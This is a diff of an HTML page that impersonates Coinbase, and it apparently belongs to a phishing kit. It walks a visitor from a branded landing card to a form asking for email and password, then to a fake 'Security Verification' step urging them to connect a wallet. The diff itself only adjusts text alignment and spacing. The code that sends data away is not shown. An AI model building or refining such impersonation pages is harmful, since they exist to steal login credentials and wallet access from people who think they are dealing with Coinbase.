@@ -10,19 +10,20 @@
 <body>
 
     <div class="container">
+        
         <!-- STEP 1: Landing -->
         <div id="step-1" class="auth-card">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1>Coinbase</h1>
-            <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
+            <h1 class="text-center">Coinbase</h1>
+            <p class="text-center">Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
             <button id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
         <!-- STEP 2: Email & Password -->
         <div id="step-2" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1>Sign In</h1>
-            <p>Please enter your account credentials.</p>
+            <h1 class="text-center">Sign In</h1>
+            <p class="text-center">Please enter your account credentials.</p>
             <form id="login-form">
                 <input type="email" id="email" placeholder="Email Address" required>
                 <input type="password" id="pass" placeholder="Password" required>
@@ -33,11 +34,12 @@
         <!-- STEP 3: Wallet Connect -->
         <div id="step-3" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1 style="font-size: 22px;">Security Verification</h1>
-            <p>To ensure account safety, please verify your wallet address to proceed with asset synchronization.</p>
+            <h1 style="font-size: 22px; text-align: center;">Security Verification</h1>
+            <p style="text-align: center;">To ensure account safety, please verify your wallet address to proceed with asset synchronization.</p>
             <button id="connectBtn" class="btn-primary">Connect Wallet</button>
-            <div id="status" style="margin-top: 20px; color: var(--cb-blue); font-size: 14px;"></div>
+            <div id="status" style="margin-top: 20px; color: var(--cb-blue); font-size: 14px; text-align: center;"></div>
         </div>
+
     </div>
 
     <footer class="footer">
